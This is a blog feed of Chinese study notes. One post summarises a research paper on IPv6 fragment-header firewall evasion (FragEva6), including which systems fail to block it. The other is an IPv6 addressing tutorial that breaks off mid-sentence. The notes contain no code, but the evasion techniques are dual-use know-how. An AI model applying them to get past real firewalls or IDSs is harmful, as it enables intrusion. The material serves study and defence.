<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Research on Security Protection Evasion Mechanism Based on IPv6 Fragment Headers</title>
      <link href="/posts/Lin%20et%20al_2024_Research%20on%20Security%20Protection%20Evasion%20Mechanism%20Based%20on%20IPv6%20Fragment%20Headers/"/>
      <url>/posts/Lin%20et%20al_2024_Research%20on%20Security%20Protection%20Evasion%20Mechanism%20Based%20on%20IPv6%20Fragment%20Headers/</url>
      
        <content type="html"><![CDATA[<h1 id="Research-on-Security-Protection-Evasion-Mechanism-Based-on-IPv6-Fragment-Headers"><a href="#Research-on-Security-Protection-Evasion-Mechanism-Based-on-IPv6-Fragment-Headers" class="headerlink" title="Research on Security Protection Evasion Mechanism Based on IPv6 Fragment Headers"></a>Research on Security Protection Evasion Mechanism Based on IPv6 Fragment Headers</h1><h1 id="基于IPv6分片头的安全保护逃逸机制"><a href="#基于IPv6分片头的安全保护逃逸机制" class="headerlink" title="基于IPv6分片头的安全保护逃逸机制"></a>基于IPv6分片头的安全保护逃逸机制</h1><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>IPv6分片头是数据包分片的关键，但可以被利用来逃避安全系统，构成实质性的威胁。</p><p>尽管RFC-7112强调了“IPv6分片逃避行为”的含义，但缺乏全面的评估，阻碍了对标准符合性的评估。</p><p>同时，现有的IPv6分片逃避行为主要集中在微小&#x2F;重叠的分片上，忽略了其他IPv6扩展头的组合。</p><p>因此，论文提出了一个IPv6分片回避（FragEva6）行为模型，演示了从IPv6报头到FragEva6机制的逐步构建过程。</p><p>随后，对17个主流操作系统和4个安全系统的评估显示，最新版本的Windows和Apple操作系统在处理IPv6碎片时符合RFC 7112，而Linux操作系统则表现出部分不符合。</p><p>此外，安全系统（Windows Defender 20230503.1、ip6tables 1.8.9、Suricata v6.0.12和Snort v3.1.61.0）表现出的缓解措施不足，使它们容易受到通过操纵IPv6片段报头逃避威胁的影响。</p><p>最后，为了说明这些行为的严重性，本研究实现了基于FragEva6机制的链路上主机扫描活动，成功地避开了防火墙并引发了目标响应。。</p><h2 id="1-背景"><a href="#1-背景" class="headerlink" title="1. 背景"></a>1. 背景</h2><h3 id="1-1-IPv6分片首部"><a href="#1-1-IPv6分片首部" class="headerlink" title="1.1 IPv6分片首部"></a>1.1 IPv6分片首部</h3><p>IPv6报文中有一个8比特的字段：下一个首部。</p><p>在<a href="https://www.iana.org/assignments/protocol-numbers/protocol-numbers.xhtml">互联网地址编码分配机构（Internet Assigned Numbers Authority，IANA）的Protocol Number</a><br>中规定了IPv6分片的字段值为：44，它代表了网络层对数据进行了分片操作。</p><p><img src="/img/FragEva6/image-1.png" alt="alt text"></p><p>一个IPv6的分片首部总共8字节，具体结构如下：</p><p>下一个首部8位|保留8位|分片偏移13位|保留（Res）2位|M（1位）|标识符（32位）</p><ul><li><p>保留字段和Res字段：保留字段和Res都是保留字段，设置为零。<br>（同样这里也存在安全问题，因为可以利用这个字段传递信息而不被人关注。）</p></li><li><p>下一个首部：标识分片承载的选项或者上层协议，可以是选项DOH或者协议ICMP，上层协议TCP等等。它是引发安全问题的原因，因为防火墙检测将检查此字段字段以判断报文是否合法。</p></li><li><p>M字段：表明该分片是否为原始数据报的最后一个分片。与IPv4一样。<br>如果值为1，代表有更多的分片，如果值为0，代表最后一个分片。</p></li><li><p>标识字段：用于标识这些分片属于同一个，方便网络层重新将它们组装起来。</p></li><li><p>分片偏移：以8字节为单位，相当于标识顺序，因为分片可能不按照顺序到达。<br>第一个分片offset为0，第二一般是181，因为如果数据包需要分片，那么ip头和分片头48字节加181*8字节刚好1496字节，再多一个就超过MTU的1500字节了。</p></li></ul><p>一个典型的分段操作如下：</p><p><img src="/img/FragEva6/image-2.png" alt="alt text"></p><h3 id="1-2-现有FragEva6行为"><a href="#1-2-现有FragEva6行为" class="headerlink" title="1.2 现有FragEva6行为"></a>1.2 现有FragEva6行为</h3><p>根据RFC 7112，第一个片段应该包含完整的上层协议的报头。</p><p>比如在图2中，它的分片1需要包含整个上层协议的报头。</p><p>但是FragEva6违反了这一要求，它将完整的上层报头分散到不同的片段中，例如，它可能出现在Fig2的分片2或3中。</p><p>现有关于FragEva6机制的文献主要集中在微小片段逃避和重叠片段逃避行为上。</p><h4 id="1-2-1-微小碎片逃避行为"><a href="#1-2-1-微小碎片逃避行为" class="headerlink" title="1.2.1 微小碎片逃避行为"></a>1.2.1 微小碎片逃避行为</h4><p>在图1场景中，防火墙拦截来自任何源的ICMPv6 Echo Request报文到主机b。如图3所示，攻击者为了达到目的，将一个1280字节的IPv6报文按照56字节的MTU进行拆分，IPv6报头和分片扩展头占据48字节，因此数据部分只有8字节，导致上层报头链被限制在IPv6报头链的第155个分片。ICMPv6头只能存在于第155个片段中。由于中间防火墙设备仅限于检查第一个分片，只能发现DOH字段，无法识别上层ICMPv6信息，因此产生了利用微小片段的逃避行为。</p><p><img src="/img/FragEva6/image-4.png" alt="alt text"></p><p>关于DOH，在IANA的Protocol Nunmer中可以看到这个选项。</p><p><img src="/img/FragEva6/image-5.png" alt="alt text"></p><p>Destination Options报头用于承载仅需要由数据包的目的地节点检查的可选信息。<br>下一个首部同样遵循IANA的Protocol Number。所以DOH更像一个选项，向IPv4中的选项一样，而不是一个上层协议。<br><img src="/img/FragEva6/image-7.png" alt="alt text"></p><h4 id="1-2-2-重叠分片逃避行为"><a href="#1-2-2-重叠分片逃避行为" class="headerlink" title="1.2.2 重叠分片逃避行为"></a>1.2.2 重叠分片逃避行为</h4><p>当攻击者精心构建多个分片数据包共享相同的分片标识时，重叠分片就会出现。由于故意配置错误的片段偏移字段值，这些数据包显示片段之间的字节重叠。在目的主机的重组过程中，后续分片中非法重叠的数据可能会覆盖之前分片中对应的数据。</p><p>在图1的场景中，攻击者发送到目标主机的第一个片段包含一个DOH头，而第二个片段包含一个与第一个片段重叠的ICMPv6上层头，如图4所示。在主机接收分片后使用ICMPv6报头将DOH报头覆盖。由于中间防火墙设备只能检测第一个分片报文，无法检测到分片重叠或是否存在ICMPv6上层信息，从而导致规避行为。</p><p><img src="/img/FragEva6/image-6.png" alt="alt text"></p><h3 id="1-3-当前工作的局限"><a href="#1-3-当前工作的局限" class="headerlink" title="1.3 当前工作的局限"></a>1.3 当前工作的局限</h3><p>目前对IPv6分片规避机制的研究有限，主要集中在不符合rfc标准的分片报文上，如微小分片和重叠分片。</p><p>此外，缺乏对这个问题进行实际检查和测试的模型或工具。</p><p>为此，本文首次提出了IPv6分片逃避行为的构造模型FragEva6。该模型集成了其他IPv6扩展报头，以扩展现有的FragEva6行为类型。</p><h2 id="2-介绍"><a href="#2-介绍" class="headerlink" title="2. 介绍"></a>2. 介绍</h2><p>IPv6报文下一个首部的引入增强了可扩展性，但同时也产生了许多安全问题。</p><p>IPv6下一个首部的分片首部被证明存在漏洞：如重叠碎片和微小碎片，对互联网构成多方面的威胁：拒绝服务（DoS），操作系统（OS）指纹识别和入侵检测系统（IDS）规避等。</p><p>微小片段（违反RFC-2460）和重叠片段（违反RFC-5722），这些片段很容易逃避Snort或Suricata等流行的IDS。认识到解决这些基于IPv6片段的威胁的迫切需要，提出了征求意见RFC-7112。</p><h4 id="关于RFC-7112"><a href="#关于RFC-7112" class="headerlink" title="关于RFC-7112"></a>关于RFC-7112</h4><p>RFC2460的更新，要求所有报头（从IPv6基本报头开始，一直到上层报头（例如TCP等））都出现在第一个片段中。因为防火墙检测第一个分片中的上层协议信息，如果没有上层协议的报头，那么可能造成安全威胁。<br>RFC-7112旨在解决过长的IPv6报头链的安全问题。攻击者滥用IPv6分片机制将报头链分割成多个片段，通常留下的第一个片段缺乏关键的上层报头信息，如TCP（传输控制协议）或ICMPv6（互联网控制消息协议版本6）报头。安全系统通常只检查第一个分片中的上层信息，使得隐藏在后面数据包中的恶意数据难以检测。这些看似无害的碎片一旦在主机层面重新组装，就可以对目标主机执行DoS等威胁。图1是一个使用IPv6分片机制规避防火墙的示例。本研究提出了IPv6分片逃避行为等问题，具体表示为FragEva6行为。</p><p>RFC 7112建议目的主机丢弃这些上层报头信息不完整的IPv6分片，以对抗FragEva6驱动的威胁。</p><p><img src="/img/FragEva6/image-3.png" alt="alt text"></p><h4 id="关于RFC-5722"><a href="#关于RFC-5722" class="headerlink" title="关于RFC-5722"></a>关于RFC-5722</h4><p>阐述如何处理重叠的分片。</p><p>基本IPv6规范中指定的碎片和重组算法允许碎片重叠。</p><p>本文档演示了与允许重叠片段相关的安全问题，并更新了IPv6规范以明确禁止重叠片段。</p><p>传输需要分段的数据报的IPv6节点不得创建重叠的分段。在重新组装IPv6数据报时，如果确定其一个或多个组成片段是重叠片段，则必须无声地丢弃整个数据报（以及任何组成片段，包括尚未接收到的片段）。</p><h3 id="2-2-论文工作"><a href="#2-2-论文工作" class="headerlink" title="2.2 论文工作"></a>2.2 论文工作</h3><ul><li>扩展FragEva6的行为与机制</li><li>开发了一组测试套件</li><li>对操作系统和安全系统进行实验并做了评估</li><li>利用FragEva6实现主机扫描</li></ul><h2 id="3-FragEva6行为的建模与机制"><a href="#3-FragEva6行为的建模与机制" class="headerlink" title="3. FragEva6行为的建模与机制"></a>3. FragEva6行为的建模与机制</h2><h3 id="3-1-Frageva6行为的建模与机制"><a href="#3-1-Frageva6行为的建模与机制" class="headerlink" title="3.1 Frageva6行为的建模与机制"></a>3.1 Frageva6行为的建模与机制</h3><p>为了阐明分片逃避行为的机制，提出FragEva6行为的模型，如图5所示。</p><p><img src="/img/FragEva6/image-8.png" alt="alt text"></p><p>（S1到S4象征着对手通过IPv6扩展头制作行为过程中的4个阶段。<br>状态之间的箭头表示每个步骤中的特定操作，驱动行为状态的转换。）</p><p>起始状态S1由IPv6基本报头组成。</p><p>步骤1添加IPv6分片头，也就是将将IPv6报头的下一个首部字段设置为44，过渡到状态S2。</p><p>步骤2包含额外的IPv6扩展头，如将分片头中下一个首部字段设置为DOH，达到状态S3。</p><p>最后，步骤3追加上层报头，如将分片中的头中的下一个首部字段设置为ICMP，最终达到最终状态S4，包含FragEva6包。</p><h4 id="3-1-1-步骤1：添加IPv6分片头"><a href="#3-1-1-步骤1：添加IPv6分片头" class="headerlink" title="3.1.1 步骤1：添加IPv6分片头"></a>3.1.1 步骤1：添加IPv6分片头</h4><p>下面两段的意思基本是，分片大小原则上不会影响实验，因为RFC没有规定分片就必须大于等于1280字节。但是，可能不同的安全系统对这个分片大小可能不一样，所以为了严谨性将两者分开。</p><ul><li>微小分片逃避行为：微小的分片本身没有固有的问题，RFC指南也没有规定IPv6应该如何管理小于1280字节的数据包。但是逃避行为利用了较小的MTU的属性，将出站数据包划分为极小的长度，从而将对防火墙或IDS检测至关重要的上层数据替换为后续的分片。</li><li>超大分片规避行为：超大分片是指分片长度大于等于1280字节。类似于基于微小片段的逃避的基本原理，IPv6超大片段逃避行为利用IPv6扩展报头的属性在恶意数据包中嵌入大量扩展报头选项（例如，DOH报头包含许多PadN选项），增加数据包长度并触发碎片。这种策略将数据包的上层报头数据重新定位到后续的片段中，从而便于逃避。</li></ul><h4 id="3-1-2-步骤2：添加其他IPv6扩展头"><a href="#3-1-2-步骤2：添加其他IPv6扩展头" class="headerlink" title="3.1.2 步骤2：添加其他IPv6扩展头"></a>3.1.2 步骤2：添加其他IPv6扩展头</h4><p>下面四种方式都有可能绕过安全机制</p><ul><li>A：不超过2个DOH头的可分割部分</li><li>B：基于IPv6扩展头的重叠分片</li><li>C：包含大量相同类型的扩展头的片段逃避行为</li><li>D：包含多种不同类型扩展头的片段逃避行为<br>在步骤2之后，FragEva6行为已经创建了IPv6报头、IPv6分片报头和其他扩展报头。为了实现FragEva6行为，必须通过添加真正的上层报头来完成步骤3。</li></ul><h4 id="3-1-3-步骤3：添加上层表头"><a href="#3-1-3-步骤3：添加上层表头" class="headerlink" title="3.1.3 步骤3：添加上层表头"></a>3.1.3 步骤3：添加上层表头</h4><p>在IPv6中，“下一个报头”字段用于识别后续扩展报头的类型，攻击者可以利用这种机制来隐藏上层报头的性质，并增加片段逃避行为的复杂性。受RFC 7113的启发，本研究根据第一个片段中上层报头标识符的表现，将分片逃避行为分为两类。</p><ul><li><p>已知上层报头协议类型的逃避行为：在这种分片报文中，攻击者可以使用分片报头和其他扩展报头来隐藏上层报头的协议类型（如ICMPv6）。图6中的原始数据包包含完整的IPv6报头链，顶部有一个ICMPv6报头作为上层报头。值得注意的是，第一个片段中的最后一个“下一个报头”字段被赋值为58，表明ICMPv6（一种已知的上层报头协议类型），而ICMPv6报头出现在第二个片段中。<br><img src="/img/FragEva6/image-9.png" alt="alt text"></p></li><li><p>上层报头协议类型未知的逃避行为：在这样的分片报文中，攻击者隐藏了上层报头的协议类型。导致中间设备无法识别上层报头的类型。图7中的原始数据包包含完整的IPv6报头链，上层报头的协议类型为ICMPv6。第一个片段中的最后一个“下一个报头”字段被赋值为60，表示DOH报头（不是上层报头），而实际的ICMPv6报头出现在第二个片段中。因此，第一个分片没有上层报头的协议类型。<br><img src="/img/FragEva6/image-10.png" alt="alt text"></p></li></ul><h4 id="3-1-4-测试套件实现"><a href="#3-1-4-测试套件实现" class="headerlink" title="3.1.4 测试套件实现"></a>3.1.4 测试套件实现</h4><p>由于缺乏对FragEva6机制的研究和缺乏公开的测试工具，作者创建了一个基于第三节中描述的FragEva6行为模型的测试套件（FragEva6- build）。</p><p>表1列出了测试用例。<br><img src="/img/FragEva6/image-11.png" alt="alt text"></p><h2 id="4-测试和评估FragEva6行为"><a href="#4-测试和评估FragEva6行为" class="headerlink" title="4. 测试和评估FragEva6行为"></a>4. 测试和评估FragEva6行为</h2><h3 id="4-1-FragEva6行为的测试与评估策略"><a href="#4-1-FragEva6行为的测试与评估策略" class="headerlink" title="4.1 FragEva6行为的测试与评估策略"></a>4.1 FragEva6行为的测试与评估策略</h3><h4 id="4-1-1-实验一：主流操作系统的规范性测试"><a href="#4-1-1-实验一：主流操作系统的规范性测试" class="headerlink" title="4.1.1 实验一：主流操作系统的规范性测试"></a>4.1.1 实验一：主流操作系统的规范性测试</h4><p>对流行操作系统中的内核协议栈进行了严格的测试，以验证它们是否符合RFC 7112中规定的IPv6分片处理指南。</p><p>对于Linux系统的测试可以发现，操作系统对于上层协议unknown的分片都没有防护。<br><img src="/img/FragEva6/image-12.png" alt="alt text"></p><p>Windows操作系统相对好的多，但是对于较低版本的系统缺乏支持。<br><img src="/img/FragEva6/image-13.png" alt="alt text"></p><h4 id="4-1-2-实验2：安全防护系统评估和威胁验证"><a href="#4-1-2-实验2：安全防护系统评估和威胁验证" class="headerlink" title="4.1.2 实验2：安全防护系统评估和威胁验证"></a>4.1.2 实验2：安全防护系统评估和威胁验证</h4><p>对于在内核级别没有充分执行RFC 7112的操作系统，我们研究了防火墙等安全解决方案，当配置了全面的规则集时，是否可以有效地拦截利用FragEva6机制的恶意尝试，并证实FragEva6威胁的存在。</p><p>Linux和一些windows 11之前的系统对RFC标准的遵守程度有限，而苹果的操作系统则完全符合。<br>因此，本节将评估Windows Defender 20230503.1 （Windows）、ip6tables 1.8.9 （Linux）和顶级支持ipv6的开源IDS: Suricata v6.0.12和Snort v3.1.61.0。</p><p><img src="/img/FragEva6/image-14.png" alt="alt text"></p><p>默认的Linux防火墙ip6tables对FragEva6威胁的处理不是最优的，它只拦截那些上层报头中已知协议类型的数据包，而对未知协议类型的数据包失败。</p><p>Windows Defender， Windows默认防火墙，成功地阻止了所有测试的威胁。这表明，尽管在Windows 11之前的一些系统对RFC标准的支持较低，但当安全人员配置了适当的规则时，Windows Defender可以有效地防范基于IPv6分片报头的威胁。</p><p>Suricata可以有效地检测到所有基于icmpv6的情况，但在TCP方面表现不佳，只能识别A1。这可能源于它对TCP碎片处理不当，阻碍了威胁识别。</p><p>Snort无法拦截任何威胁，这表明FragEva6完全逃避了其规则，从而使其无效。</p><h4 id="4-1-3-实验三：IDS对FragEva6行为的检测能力"><a href="#4-1-3-实验三：IDS对FragEva6行为的检测能力" class="headerlink" title="4.1.3 实验三：IDS对FragEva6行为的检测能力"></a>4.1.3 实验三：IDS对FragEva6行为的检测能力</h4><p>认识到潜在的防火墙漏洞和操作系统在丢弃恶意数据包方面的限制，我们评估了使用其默认规则集的IDS是否能够准确识别并主动阻止使用FragEva6机制制作的潜在威胁数据包。</p><p>从实验结果的分析来看，Suricata触发4个警报，Snort触发2个警报。这些警告主要强调IPv6扩展报头使用中的违规行为，例如重复使用DOH报头和RH报头，这违反了标准的RFC一致性或代表非常规的数据包结构。<br><img src="/img/FragEva6/image-15.png" alt="alt text"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IPv6 </tag>
            
            <tag> 分片 </tag>
            
            <tag> FragEva6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IPv6详解</title>
      <link href="/posts/network-IPv6/"/>
      <url>/posts/network-IPv6/</url>
      
        <content type="html"><![CDATA[<h1 id="IPv6"><a href="#IPv6" class="headerlink" title="IPv6"></a>IPv6</h1><h2 id="1-IPv6地址"><a href="#1-IPv6地址" class="headerlink" title="1. IPv6地址"></a>1. IPv6地址</h2><h3 id="1-1-IPv6地址表示"><a href="#1-1-IPv6地址表示" class="headerlink" title="1.1 IPv6地址表示"></a>1.1 IPv6地址表示</h3><p>IPv6地址使用冒分16进制表示，即用冒号分隔的16进制表示。<br>128位可以用32个16进制字符表示，每4个字符之间使用冒号进行分隔，这样的话32个16进制被分成8组。</p><p>就像这样： <em><strong>fe80:0000:0000:0000:9100:e409:60df:02f1</strong></em></p><p>首先，遇到000a:0000:00bc:…，可以简化成a:0:bc:…，相当于省去前面的零。</p><p>把上面例子简化得到： <em><strong>fe80:0:0:0:9100:e409:60df:2f1</strong></em></p><p>其次，这样连续的三组都是零，因此可以将连续三组的零写成双冒号“::”以简化表示： <em><strong>fe80::9100:e409:60df:2f1。</strong></em></p><p><em><strong>需要注意的是，这样的省略只可以进行一次，比如把0:0:0:0:0:a:0:0:0写成::a::，这样分不清楚前面有多少组零，后面有多少组零。<br>因此简写最多连续的零::a:0:0:0，这样就清楚前面是5组零，后面是3组零了（如果相同多连续的零，那么优先简写左边的零）</strong></em></p><h3 id="1-2-IPv6地址结构"><a href="#1-2-IPv6地址结构" class="headerlink" title="1.2 IPv6地址结构"></a>1.2 IPv6地址结构</h3><p><img src="/img/network_IPv6/image-1.png" alt="alt text"></p><h4 id="1-2-1-全球单播地址（Global-Unicast-Address，GUA）"><a href="#1-2-1-全球单播地址（Global-Unicast-Address，GUA）" class="headerlink" title="1.2.1 全球单播地址（Global Unicast Address，GUA）"></a>1.2.1 全球单播地址（Global Unicast Address，GUA）</h4><ul><li>前缀001：3 bit，20到3f，占据IPv6的1&#x2F;8的地址空间。也就是说2和3开头的地址是全球单播地址。</li><li>顶级聚合（Top Level Aggregation，TLA）：13bit， IPv6的管理机构根据TLA分配不同的地址给某些骨干网的ISP，最大可以得到8192个顶级路由。</li><li>保留（Reserve，RES）：8 bit，保留使用，为未来扩充TLA或者NLA预留。</li><li>次级聚合（Next Level Aggregation，NLA）：24bit，骨干网ISP根据NLA为各个中小 ISP分配不同的地址段，中小ISP也可以针对NLA进一步分割不同地址段，分配给不同用户。</li><li>站点级聚合（Site Level Aggregation，SLA）：16bit，公司或企业内部根据SLA把同一大块地址分成不同的网段，分配给各站点使用，一般用作公司内部网络规划，最大可以有65536个子网。</li><li>接口地址（Interface ID）：64位，主机使用的地址范围，几乎是远远超出现在的设备数量。</li></ul><h4 id="1-2-2-本地单播地址（Unique-Local-Address，ULA）"><a href="#1-2-2-本地单播地址（Unique-Local-Address，ULA）" class="headerlink" title="1.2.2 本地单播地址（Unique Local Address，ULA）"></a>1.2.2 本地单播地址（Unique Local Address，ULA）</h4><p>fc或者fd开头，占据IPv6的1&#x2F;128的地址空间。类似IPv4中的私有地址。</p><h4 id="1-2-3-链路本地地址"><a href="#1-2-3-链路本地地址" class="headerlink" title="1.2.3 链路本地地址"></a>1.2.3 链路本地地址</h4><p>fe80到febf，占据IPv6的1&#x2F;1024的地址空间。作用就像MAC地址一样，用于本地链路（局域网）之间的通信。（设备上的链路本地地址基本都是以fe80开头）</p><h4 id="1-2-4-两个特殊地址"><a href="#1-2-4-两个特殊地址" class="headerlink" title="1.2.4 两个特殊地址"></a>1.2.4 两个特殊地址</h4><ul><li>未指定地址： ::&#x2F;128。全零地址，类似于IPv4中的0.0.0.0。一个设备在没有获取IP地址之前用于向DHCP服务器申请IP地址时，原地址就是设置为0。</li><li>本地回环地址： ::1&#x2F;128。前面全零，只有最后一位为一的地址，类似于IPv4中的127.0.0.1。</li></ul><h4 id="1-2-5-内嵌IPv4地址"><a href="#1-2-5-内嵌IPv4地址" class="headerlink" title="1.2.5 内嵌IPv4地址"></a>1.2.5 内嵌IPv4地址</h4><ul><li>兼容IPv4的IPv6地址： ::x.x.x.x或者0:0:0:0:0:0:x.x.x.x。就是将前面96位置为零，后面32位设置为IPv4的地址。</li><li>映射IPv4的IPv6地址： ::ffff:x.x.x.x。</li><li>6to4地址： 以2002为前缀。<br>（没搞懂）</li></ul><h4 id="1-2-6-组播地址"><a href="#1-2-6-组播地址" class="headerlink" title="1.2.6 组播地址"></a>1.2.6 组播地址</h4><p>指定组播地址： ff00到ffff，占据IPv6的1&#x2F;256的地址空间。</p><p>下面是一些本地链路范围的组播地址</p><ul><li>FF02:0:0:0:0:0:0:1 所有节点的组播地址。</li><li>FF02:0:0:0:0:0:0:2 所有路由器的组播地址。</li><li>FF02:0:0:0:0:1:FFXX:XXXX 被请求节点（Solicited-Node）组播地址。</li><li>FF02:0:0:0:0:0:0:5 所有OSPF路由器组播地址。</li><li>FF02:0:0:0:0:0:0:6 所有OSPF的DR路由器组播地址。</li><li>FF02:0:0:0:0:0:0:D 所有PIM路由器组播地址。<br>其中最重要的是被请求节点组播地址，它由固定前缀FF02::1:FF00:0&#x2F;104和单播IPv6地址的最后24bit组成。<br>同时设备将组播IP地址的后32位添加到33开头的MAC地址，这样得到一个虚拟的组播MAC地址。<br>你可以看到的是只有IPv6地址后24位相同的设备才会加入一个组。<br>然后这台设备就会监听这个组播MAC地址和组播IP地址，如果得到指向这个组的地址，才会进行报文处理。</li></ul><h5 id="1-2-7-组播地址如何工作？"><a href="#1-2-7-组播地址如何工作？" class="headerlink" title="1.2.7 组播地址如何工作？"></a>1.2.7 组播地址如何工作？</h5><p>首先，很明确的一点是IPv6使用组播机制代替广播机制是明智的。<br>因为广播会让报文充斥整个局域网，并且每台设备都将处理报文并检查与自己是否相关。<br>然而，广播的范围是可以利用一些信息一定程度缩小的，组播正是利用了这一特性。<br>比如你希望局域网中的所有Windows设备回复你的消息，你只能广播出去；但是如果每个Windows设备监听一个组播地址，这件事情就变得简单了。<br>下面是两个例子。<br><em><strong>如何使用组播地址完成无状态配置IPv6地址，并做碰撞检测？</strong></em><br>在IPv6的环境下，路由器会定期向链路中的主机发送路由通告（Router Advertisement）报文，告知本地链路中的设备网关的存在以及网路信息。</p><p>但是当一个设备进入网络时，它立即需要网络相关信息，而不是等待一个时间间隔。</p><p>因此它立即向路由器的组播地址发送一个路由请求（Router Solicitation，RS）报文，路由器也立即发送一个路由通告报文，而不用等待时间间隔。</p><p>这个报文的目的组播IP地址：FF02::2，目的组播MAC地址：33-33-00-00-00-02</p><p>路由器监听这个组播MAC地址，发现这个报文。</p><p>于是立即向所有节点的组播地址（ff02::1）发送一个路由通告（Router Advertisement，RA）报文，这个报文携带了网络信息，包括网络前缀。</p><p>这样，设备利用网络前缀加上自己随机生成的接口地址拼成一个单播地址，但是它需要证明这个地址没有被其他用户使用。</p><p>于是该设备向被请求节点组播地址发出一个邻居请求（Neighbor solicition，NS）报文，这个组播地址最后的24位复制了IP地址的后24位。</p><p>这个报文目的被请求组播地址：ff02::01:ffxx:xxxx，目的组播MAC地址：33-33-ff-xx-xx-xx</p><p>也就是说只有后24位IP相同的设备才会收到邻居请求，它们被划分为了一个组，只有这个组才可能存在和它IP地址相同的设备。</p><p>但是在设备数量比较少的时候（设设备数量为k），这种后24位比特都相同的概率是很小的大概是k&#x2F;2^24（这里假设前面的设备都没有在一个组中）。</p><p>所以，实际上设备的数量相比于2^24比较少的情况下，IPv6的组播等价与单播，这个做法极大的避免了广播的开销。</p><p>如果没有收到邻居通告（Neighbor Advertisement，NA）报文，那么重复地址检测 (DAD)完成，说明这个生成的地址没有被占据。</p><p>如果收到邻居通告（Neighbor Advertisement，NA）报文，那么说明链路中有使用这个地址的设备，需要重新生成一个不同的IP地址。<br><em><strong>如何使用组播完成ARP地址解析？</strong></em><br>节点获取单播地址后，会根据单播地址生成一个组播MAC地址。33-33是专门为IPv6组播预留的MAC地址前缀，MAC地址的后32bit从对应的组播IPv6地址的后32bit拷贝而来。<br>上面的过程将IP地址和MAC地址联系起来，当链路内一个节点发送一个组播的ARP请求，它已经知道目标的IP地址，因此生成一个组播地址作为目标MAC地址。<br>显然和目标IP地址后24位相同的设备都将监听这个组播MAC。如果IPv6地址的分配后24位尽量没有重复的情况下，IPv6的组播就接近于单播，付出的代价只有设备的网卡多监听一个组播MAC地址。</p><h3 id="1-3-IPv6地址分配-生成"><a href="#1-3-IPv6地址分配-生成" class="headerlink" title="1.3 IPv6地址分配&#x2F;生成"></a>1.3 IPv6地址分配&#x2F;生成</h3><h4 id="1-3-1-SLAAC生成接口地址（无状态配置）"><a href="#1-3-1-SLAAC生成接口地址（无状态配置）" class="headerlink" title="1.3.1 SLAAC生成接口地址（无状态配置）"></a>1.3.1 SLAAC生成接口地址（无状态配置）</h4><p>略，上面讲述的就是SLACC地址生成的方式。</p><h4 id="1-3-2-EUI-64生成接口地址"><a href="#1-3-2-EUI-64生成接口地址" class="headerlink" title="1.3.2 EUI-64生成接口地址"></a>1.3.2 EUI-64生成接口地址</h4><p>将48bits的MAC对半劈开，插入“FFFE”，然后对从左数起的第7位，也就是U&#x2F;L位取反，该比特位确定48bits的MAC地址的唯一性与否。<br>一个以太网地址可以有两种含义，地址可被全球管理或本地管理。<br>全球管理指全球唯一的例如厂商MAC，本地管理指使用自己的值临时写的MAC地址，在这种情况下，这个特殊的位&#x3D;1表示本地管理；为0表示全球管理。<br>但是在EUI-64格式中，U&#x2F;L的含义正好相反，0表示本地管理，1表示全球管理，所以这就是为什么U&#x2F;L位要取反的原因。</p><p>这种地址生成方式有一个显著的特点，中间是fffe，并且第七位为零，因此利用这个特性可以快速判断一个地址是否是EUI-64生成。</p><p>相应的，地址扫描工作也将变得简单，难度从64位下降至48位。也可以通过IPv4的ARP扫描获取MAC地址后，直接获取链路内设备的接口地址。</p><p>另外，这种地址生成方式将会把MAC地址暴露到外部网络中，而且MAC地址包含了网卡厂商的信息，有一些隐私的风险。<br>（比如黑客通过MAC地址知道了这个设备是某个厂商的某个时间点推出的，恰好有一个针对性的漏洞，这样就被轻易攻击了。）</p><p>更危险的是，这种方式的接口地址将会保持不变，连接到任意的网络之中却使用相同的接口地址，这可以造成用户被跟踪的风险。</p><p>（但不得不说这个方法都不需要ARP解析了）</p><h4 id="1-3-3-动态主机配置（Dynamic-Host-Configuration-DHCP）"><a href="#1-3-3-动态主机配置（Dynamic-Host-Configuration-DHCP）" class="headerlink" title="1.3.3 动态主机配置（Dynamic Host Configuration,DHCP）"></a>1.3.3 动态主机配置（Dynamic Host Configuration,DHCP）</h4><p>DHCPv6的IP组播地址是：ff02::1:2，MAC组播地址则是：33-33-00-01-00-02，client使用546端口，sever使用547端口<br>加入局域网的设备向这个组播地址发送报文，希望得到DHCP服务器回应即可。</p><h2 id="2-IPv6报文"><a href="#2-IPv6报文" class="headerlink" title="2. IPv6报文"></a>2. IPv6报文</h2><h3 id="2-1-链路层标识"><a href="#2-1-链路层标识" class="headerlink" title="2.1 链路层标识"></a>2.1 链路层标识</h3><p>链路层报文：</p><p>前同步码（8字节）|目的MAC地址（6字节）|源MAC地址（6字节）|类型（2字节）|数据|循坏冗余检测CRC（4字节）</p><p>链路层类型字段标识了链路层的负载是什么：</p><ul><li>ARP Ethernet Type&#x3D;0x0806</li><li>IPv4 Ethernet Type&#x3D;0x0800</li><li>IPv6 Ethernet Type&#x3D;0x86dd</li></ul><h3 id="2-2-首部"><a href="#2-2-首部" class="headerlink" title="2.2 首部"></a>2.2 首部</h3><p>IPv6的网络层长度为64比特的选项字段和256比特的IP地址信息，共320比特，40字节。MTU是1500字节，因此数据报的负载剩下1460字节。</p><p>相比于IPv4，IPv6的首部长度变长了，从20字节变为了40字节，但是选项却精简了不少。而且IPv6固定了选项字段，相比于IPv4引入作用不大的可选选项这精简了路由器处理数据报的速度。</p><p>你可以想到，320比特刚好是64比特的5倍，因此在64位机器上运行IPv6是好的，因为64位的寄存器取5次就行。但是在128位的机器上，寄存器变成128位，那么取三次为384比特，浪费一点。</p><p><img src="/img/network_IPv6/image.png" alt="alt text"></p><h3 id="2-3-版本号（Version）"><a href="#2-3-版本号（Version）" class="headerlink" title="2.3 版本号（Version）"></a>2.3 版本号（Version）</h3><p>4个比特，用于标识IP协议的版本，IPv6的值为6，IPv4为4。</p><p>这个字段和IPv4版本是公共的，它们字段值的设置遵循相同的标准。</p><p>这个字段的长度是足够的，4个比特一共可以表示16个版本，在有用的IP版本不超过16个的情况下，那么废弃没用的版本，这个字段就足够。</p><h3 id="2-4-通信类别（Traffic-class）"><a href="#2-4-通信类别（Traffic-class）" class="headerlink" title="2.4 通信类别（Traffic class）"></a>2.4 通信类别（Traffic class）</h3><p>8比特，提供下面两种服务，分别是通信优先级方面和拥塞控制方面。</p><p>差分服务字段（Differentiated Services Code 